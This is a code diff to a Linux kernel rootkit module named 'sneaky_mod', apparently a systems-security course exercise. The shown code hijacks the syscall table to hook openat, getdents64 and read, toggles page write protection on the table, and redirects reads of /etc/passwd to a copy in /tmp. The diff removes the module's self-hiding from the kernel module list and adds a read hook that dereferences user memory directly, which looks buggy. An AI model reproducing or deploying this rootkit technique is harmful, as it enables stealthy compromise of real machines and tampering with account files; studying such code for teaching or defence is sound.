@@ -15,12 +15,8 @@
 #define PREFIX "sneaky_process"
 #define PASSWORDFILE "/etc/passwd"
 #define TEMPPASSWORDFILE "/tmp/passwd"
-#define MODULESFILE "/proc/modules"
+
 #define PATH_LENGTH 100
-
-static struct list_head *prev_module;
-
-int proc_modules_fd = 0;
 
 // process id argument
 static int pid;
@@ -58,12 +54,7 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
   if(strcmp(kpathname, PASSWORDFILE) == 0) {
     copy_to_user(pathname, temppathname, sizeof(temppathname));
   }
-  if(strcmp(kpathname, MODULESFILE) == 0) {
-    proc_modules_fd = (*original_openat)(regs);
-    return proc_modules_fd;
-  } else {
-    return (*original_openat)(regs);
-  }
+  return (*original_openat)(regs);
 }
 
 // getdents64
@@ -98,17 +89,16 @@ asmlinkage int sneaky_getdents64(struct pt_regs *regs) {
 //read
 asmlinkage int (*original_read)(struct pt_regs *);
 asmlinkage int sneaky_read(struct pt_regs *regs) {
-  int fd = regs->di;
+  // int fd = regs->di;
   char *buf = (char *)regs->si;
-  size_t count = regs->dx;
-
-  char* kbuf = kvzalloc(count, GFP_KERNEL);
+  // size_t count = regs->dx;
 
   int ret = original_read(regs);
 
-  if(fd == proc_modules_fd) {
-    strncpy_from_user(kbuf, buf, count);
-    printk(KERN_DEBUG "%s", kbuf);
+  const char *name = "sneaky_mod ";
+  char *pos = strstr(buf, name);
+  if(pos) {
+    printk(KERN_INFO "%s\n", buf);
   }
 
   return ret;
@@ -139,10 +129,6 @@ static int initialize_sneaky_module(void)
   sys_call_table[__NR_getdents64] = (unsigned long)sneaky_getdents64;
   sys_call_table[__NR_read] = (unsigned long)sneaky_read;
 
-  // Hide sneaky_mod
-  prev_module = THIS_MODULE->list.prev;
-  list_del(&THIS_MODULE->list);
-
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);
 
@@ -153,9 +139,6 @@ static int initialize_sneaky_module(void)
 static void exit_sneaky_module(void) 
 {
   printk(KERN_INFO "Sneaky module being unloaded.\n");
-
-  // Unhide sneaky_mod
-  list_add(&THIS_MODULE->list, prev_module);
 
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
